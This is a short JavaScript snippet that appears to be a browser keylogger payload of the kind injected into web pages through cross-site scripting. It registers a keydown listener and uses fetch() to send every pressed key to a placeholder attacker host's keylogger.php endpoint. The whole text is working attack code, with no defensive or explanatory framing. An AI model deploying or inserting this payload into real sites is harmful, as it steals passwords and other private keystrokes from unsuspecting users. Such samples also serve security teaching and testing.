// server
let ip = "<attacker-IP-address>"
let port = "80"

// keylogger
function logKey(event){
	fetch("http://" + ip + ":" + port + "/keylogger.php?key=" + encodeURIComponent(event.key))
}

document.addEventListener('keydown', logKey);